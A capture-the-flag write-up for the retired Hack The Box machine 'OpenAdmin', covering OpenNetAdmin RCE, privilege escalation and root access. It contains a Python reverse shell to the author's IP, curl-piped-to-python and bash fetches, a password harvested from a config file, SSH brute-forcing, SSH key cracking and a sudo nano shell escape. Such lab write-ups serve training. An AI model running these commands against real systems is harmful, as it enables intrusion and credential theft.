# OpenAdmin

This is the write-up for the box OpenAdmin that got retired at the 2nd May 2020.
My IP address was 10.10.14.9 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.171    openadmin.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/openadmin.nmap 10.10.10.171
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

The web page shows the default _Apache2 Ubuntu Default Page_.
Lets search for hidden directories with **Gobuster**:
```
gobuster -u http://10.10.10.171 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It finds the following directories:
- _music_
- _artwork_
- _sierra_

The directories _artwork_ and _sierra_ have no interesting information.
The directory _music_ forwards to a page that advertises some music streaming service and in the top right is a _Login_ button, that forwards to _/ona_:

![Ona directory](openadmin_web-1.png)

By clicking on _"DOWNLOAD"_, it forwards to [OpenNetAdmin](https://opennetadmin.com) which is an open-source inventory database for IP networks.
The running version of this software is _v18.1.1_, so lets search for vulnerabilities:
```
searchsploit opennetadmin
```
```
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)
OpenNetAdmin 18.1.1 - Remote Code Execution
```

There is a known Remote Code Execution vulnerability that can be exploited with a **Bash script** or with a **Metasploit module**.

Using the Bash script:
```
bash 47691.sh 10.10.10.171/ona/
```

This starts a shell on the box as _www-data_, but as the shell is not very stable, I will execute a reverse shell script to get a real TTY shell.

Contents of the reverse shell Python script:
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.9",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

Downloading and executing the script on the box:
```
$ curl 10.10.14.9/revshell.py | python3
```

The file gets downloaded and executed and the listener on my IP and port 9001 starts a reverse shell session as _www-data_.

## Privilege Escalation

To get an attack surface on the box, it is recommended to run any **Linux Enumeration Script**:
```
curl 10.10.14.9/linpeas.sh | bash
```

The installation path of **OpenNetAdmin** is in _/opt/ona_.
By searching for passwords in the files, we find one for a MySQL database in the file _/opt/ona/www/local/config/database_settings.inc.php_:
```
(...)
db_type' => 'mysqli'
db_host' => 'localhost',
db_login' => 'ona_sys',
db_passwd' => 'n1nj4W4rri0R!',
db_database' => 'ona_default
(...)
```

Connecting to the database and enumerating it:
```
mysql -u ona_sys -p
```
```
mysql> show databases;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| ona_default        |
+--------------------+

mysql> use ona_default;

mysql> show tables;

mysql> describe users;

mysql> select id,username,password from users

+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |
|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |
+----+----------+----------------------------------+
```

Both hashes can be found in open hash databases like [CrackStation](https://crackstation.net/):
- guest:test
- admin:admin

Unfortunately that does not give us any way to escalate privileges.

On the box are two more users called _jimmy_ and _joanna_ other than root.
By testing for password reuse, we may get lucky and can login as one of them.

With the brute-forcing tool [Medusa](https://github.com/jmk-foofus/medusa), it is possible to test all credentials automatically:
```
medusa -h 10.10.10.171 -U users.list -P passwords.list -M ssh 10.10.10.171

(...)
ACCOUNT FOUND: [ssh] Host: 10.10.10.171 User: jimmy Password: n1nj4W4rri0R! [SUCCESS]
```

It found the password for the user _jimmy_ as the one used before for the MySQL database user and login via SSH is possible:
```
ssh jimmy@10.10.10.171
```

### Privilege Escalation 2

After searching for readable files for the user, we find _/var/www/internal_.
By looking at the open ports with `ss -lnpt`, it is probably running on port 52846.

The web server directory contains three files:
- index.php
- logout.php
- main.php

The file _main.php_ reads the SSH key of _joanna_:
```
(...)
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
(...)
```

The file _index.php_ has a SHA512 hash in it:
```
# (...)
if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
    if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
        $_SESSION['username'] = 'jimmy';
        header("Location: /main.php");
      } else {
        $msg = 'Wrong username or password.';
# (...)
```

This hash can be found on open hash databases like [CrackStation](https://crackstation.net/) and it is:
> Revealed

Sending a request to _main.php_ to get the SSH key.
```
curl 127.0.0.1:52846/main.php
```

It did not need any authentication and reads the file and shows the encrypted SSH key in _/home/joanna/.ssh/id_rsa_:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
(...)
```

Cracking the SSH key with **JohnTheRipper**:
```
sshng2john joanna_id_rsa > joanna_ssh.hash

john --wordlist=/usr/share/wordlists/rockyou.txt joanna_ssh.hash
```

After a while it gets cracked and the password is:
> bloodninjas

Login into the box via SSH as _joanna_:
```
ssh -i joanna.ssh joanna@10.10.10.171
```

### Privilege Escalation to root

When checking the sudo privileges of _joanna_, the user can run a `nano` command with root privileges:
```
sudo -l

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

The binary `nano` has an entry in [GTFOBins](https://gtfobins.github.io/gtfobins/nano/) and can be abused when using it with `sudo` to run commands without dropping privileges.

Executing `nano` and running `sh` with root privileges:
```
sudo /bin/nano /opt/priv
```
```
CTRL + R

CTRL + X

reset; sh 1>&0 2>&0
```

This spawns a shell as root!
